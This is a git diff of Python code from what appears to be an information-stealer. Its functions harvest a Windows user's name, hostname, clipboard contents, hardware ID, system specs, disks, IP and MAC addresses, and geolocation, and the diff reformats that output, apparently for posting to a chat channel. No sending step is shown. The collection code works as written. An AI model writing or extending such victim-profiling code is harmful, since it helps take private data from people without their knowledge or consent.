@@ -14,7 +14,7 @@ def user():
     hostname = os.getenv('COMPUTERNAME')
     username = os.getenv('USERNAME')
 
-    return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}"
+    return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}\n"
         
 
 def system():
@@ -24,16 +24,19 @@ def system():
         hwid = "Unknown"
     
     try:
-        clipboard = pyperclip.paste()
+        clipboard = f"``````{pyperclip.paste()}``````"
     except:
         clipboard = "Unknown"
+    
+    if clipboard == "":
+        clipboard = "null"
     
     cpu = wmi.WMI().Win32_Processor()[0].Name
     gpu = wmi.WMI().Win32_VideoController()[0].Name
     ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize
     ram = round(float(ram) / 1048576)
     
-    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}"
+    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}\n"
 
 
 def disk():
@@ -42,7 +45,7 @@ def disk():
         if os.name == 'nt' and ('cdrom' in i.opts or i.fstype == ''):
             continue
         usage = psutil.disk_usage(i.mountpoint)
-        disks.append("{:<9} {:<9} {:<9} {:<9}\n".format(i.device, str(usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%"))
+        disks.append("{:<9} {:<9} {:<9} {:<9}\n".format(i.device, str(usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%" + "\n"))
     return "".join(disks)
 
 
@@ -63,7 +66,7 @@ def network():
     mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
     country, region, city, zip_code, isp = location(public_ip)
     
-    return f"\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
+    return f"\nPublic IP: {public_ip}\nLocal IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
 
 
 #print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
